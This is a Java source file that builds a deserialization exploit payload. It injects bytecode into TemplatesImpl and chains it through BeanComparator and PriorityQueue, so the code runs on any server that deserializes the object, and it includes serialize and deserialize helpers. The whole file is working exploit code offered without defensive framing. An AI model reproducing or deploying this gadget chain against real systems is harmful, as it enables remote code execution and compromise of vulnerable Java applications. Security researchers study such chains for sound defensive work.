package org.sec.core;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

@SuppressWarnings("all")
public class Payload {
    public static Object getPayload(String newKey) {
        try {
            byte[] code = Generator.getBytesCode(newKey);
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            queue.add("1");
            queue.add("1");
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{templates, templates});
            return queue;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(Object object, String fieldName) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            return field.get(object);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] serialize(Object o) {
        try {
            ByteArrayOutputStream aos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(aos);
            oos.writeObject(o);
            oos.flush();
            oos.close();
            return aos.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void deserialize(byte[] bytes) {
        try {
            ByteArrayInputStream ais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(ais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] getBytesCodeFromFile(String name) {
        try {
            URI uri = Payload.class.getResource(name + ".class").toURI();
            return Files.readAllBytes(Paths.get(uri));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
